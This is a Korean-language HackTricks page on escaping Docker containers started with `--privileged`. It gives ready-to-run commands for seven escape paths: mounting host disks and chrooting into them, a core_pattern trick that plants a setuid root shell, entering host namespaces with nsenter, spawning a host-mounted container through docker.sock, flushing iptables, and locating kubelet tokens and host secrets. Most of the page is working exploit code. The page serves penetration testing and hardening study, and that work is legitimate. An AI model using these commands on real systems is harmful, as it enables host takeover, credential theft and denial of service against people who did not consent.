# `--privileged` 컨테이너에서 탈출하기

{{#include ../../../banners/hacktricks-training.md}}

## 개요

`--privileged`로 시작된 컨테이너는 단순히 권한 몇 개가 추가된 일반 컨테이너와 같지 않습니다. 실제로 `--privileged`는 보통 워크로드가 위험한 호스트 리소스에서 멀어지게 하는 몇몇 기본 런타임 보호 기능을 제거하거나 약화합니다. 정확한 효과는 런타임과 호스트에 따라 달라지지만, Docker의 일반적인 결과는 다음과 같습니다:

- 모든 capabilities가 부여된다
- device cgroup 제한이 해제된다
- 많은 커널 파일시스템이 더 이상 읽기 전용으로 마운트되지 않는다
- 기본적으로 마스킹된 procfs 경로가 사라진다
- seccomp 필터링이 비활성화된다
- AppArmor 제한이 비활성화된다
- SELinux 격리가 비활성화되거나 훨씬 더 넓은 레이블로 대체된다

중요한 결과는 privileged 컨테이너는 보통 미묘한 커널 익스플로잇을 필요로 하지 않는다는 점입니다. 많은 경우 호스트 장치, 호스트에 노출된 커널 파일시스템, 또는 런타임 인터페이스와 직접 상호작용한 후 호스트 셸로 피벗할 수 있습니다.

## `--privileged`가 자동으로 변경하지 않는 사항

`--privileged`는 호스트의 PID, network, IPC, 또는 UTS 네임스페이스에 자동으로 합류하지 않습니다. privileged 컨테이너는 여전히 private 네임스페이스를 가질 수 있습니다. 이는 일부 탈출 체인이 다음과 같은 추가 조건을 필요로 한다는 뜻입니다:

- 호스트 bind mount
- 호스트 PID 공유
- 호스트 네트워킹
- 보이는 호스트 장치
- 쓰기 가능한 proc/sys 인터페이스

이러한 조건들은 실제 잘못된 구성에서 자주 만족되기 쉽지만, 개념적으로는 `--privileged` 자체와는 별개입니다.

## 탈출 경로

### 1. 노출된 장치를 통해 호스트 디스크 마운트하기

privileged 컨테이너는 보통 `/dev` 아래에서 훨씬 더 많은 디바이스 노드를 볼 수 있습니다. 호스트 블록 디바이스가 보이는 경우, 가장 단순한 탈출 방법은 이를 마운트하고 `chroot`로 호스트 파일시스템으로 들어가는 것입니다:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
루트 파티션이 명확하지 않다면 먼저 블록 레이아웃을 열거하세요:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
실무적으로 writable host mount에 `setuid` helper를 심는 것이 `chroot`하는 것보다 현실적이라면, 모든 파일시스템이 `setuid` 비트를 존중하는 것은 아니라는 점을 기억하세요. 간단한 호스트 측 권한 확인은 다음과 같습니다:
```bash
mount | grep -v "nosuid"
```
이는 `nosuid` 파일시스템 하의 쓰기 가능한 경로가 고전적인 "drop a setuid shell and execute it later" 워크플로우에는 훨씬 덜 흥미롭기 때문에 유용합니다.

The weakened protections being abused here are:

- 전체 디바이스 노출
- 광범위한 capabilities, 특히 `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. 호스트 bind mount를 재사용하거나 새로 마운트한 뒤 `chroot`

호스트 루트 파일시스템이 이미 컨테이너 내부에 마운트되어 있거나, 컨테이너가 privileged 상태여서 필요한 마운트를 생성할 수 있다면, 호스트 셸은 종종 단 한 번의 `chroot`만으로 접근할 수 있습니다:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
호스트 루트 bind mount가 없지만 호스트 스토리지에 접근할 수 있으면 하나를 생성하세요:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
이 경로는 다음을 악용합니다:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 쓰기 가능한 `/proc/sys` 또는 `/sys` 악용

`--privileged`의 주요 결과 중 하나는 procfs와 sysfs에 대한 보호가 훨씬 약해진다는 것입니다. 이는 보통 마스킹되거나 읽기 전용으로 마운트된 호스트를 향한 커널 인터페이스를 노출시킬 수 있습니다.

대표적인 예는 `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
다른 고가치 경로에는 다음이 포함됩니다:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
This path abuses:

- masked paths 누락
- read-only system paths 누락

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

특권 컨테이너는 일반적으로 표준 컨테이너에서 제거되는 capabilities들을 획득합니다. 예: `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` 등. 이는 다른 노출된 표면이 존재하는 즉시 로컬 foothold를 호스트 탈출로 전환하기에 충분한 경우가 많습니다.

간단한 예로 추가 파일시스템을 마운트하고 네임스페이스 진입을 사용하는 경우가 있습니다:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
호스트 PID도 공유되어 있다면, 이 단계는 더 짧아집니다:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
이 경로는 다음을 악용합니다:

- 기본 privileged capability 세트
- 선택적 호스트 PID 공유

관련 페이지:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. 런타임 소켓을 통한 탈출

권한이 부여된 컨테이너는 종종 호스트의 런타임 상태나 소켓이 노출된 상태가 됩니다. Docker, containerd, 또는 CRI-O 소켓에 접근할 수 있다면, 가장 단순한 방법은 런타임 API를 사용해 호스트 접근 권한을 가진 두 번째 컨테이너를 실행하는 것입니다:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd의 경우:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
이 경로는 다음을 악용합니다:

- privileged runtime exposure
- host bind mounts created through the runtime itself

관련 페이지:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. 네트워크 격리의 부작용 제거

`--privileged` 자체만으로는 호스트 네트워크 네임스페이스에 조인하지 않지만, 컨테이너가 `--network=host` 또는 다른 호스트 네트워크 접근 권한을 가진 경우 전체 네트워크 스택이 수정 가능해집니다:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
이것이 항상 직접적인 호스트 쉘을 의미하는 것은 아니지만, denial of service, traffic interception, 또는 loopback-only management services에 대한 접근을 초래할 수 있습니다.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. 호스트 시크릿 및 런타임 상태 읽기

깨끗한 쉘 이스케이프가 즉시 발생하지 않더라도, privileged containers는 종종 호스트 시크릿, kubelet 상태, 런타임 메타데이터, 및 인접한 컨테이너 파일시스템을 읽을 수 있는 충분한 접근 권한을 갖고 있다:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var`가 호스트에 마운트되어 있거나 runtime 디렉터리가 노출되어 있으면, host shell을 얻기 전에조차 lateral movement나 cloud/Kubernetes credential theft에 충분할 수 있다.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 확인

다음 명령들의 목적은 어떤 privileged-container escape families가 즉시 실행 가능한지 확인하는 것이다.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
여기서 주목할 점:

- 전체 capability 집합, 특히 `CAP_SYS_ADMIN`
- 쓰기 가능한 proc/sys 노출
- 노출된 host 장치
- seccomp 및 MAC confinement 부재
- runtime sockets 또는 host root bind mounts

위 항목들 중 어느 하나만으로도 post-exploitation에 충분할 수 있다. 여러 항목이 함께 있을 경우 container는 기능적으로 host compromise까지 보통 한두 명령어 차이다.

## 관련 페이지

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
